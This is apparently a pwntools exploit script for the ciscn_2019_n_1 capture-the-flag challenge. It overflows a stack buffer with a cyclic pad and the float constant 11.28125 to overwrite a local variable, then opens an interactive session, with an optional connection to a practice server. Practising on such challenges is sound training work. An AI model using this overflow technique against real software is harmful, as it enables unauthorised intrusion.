# method two

from pwn import *


p = process("./ciscn_2019_n_1")
# p = remote("node4.buuoj.cn", 26553)

# cover ```v2``` to ```11.28125```
payload = cyclic(0x30-0x4)+p32(0x41348000)
pause()
p.sendline(payload)

p.interactive()

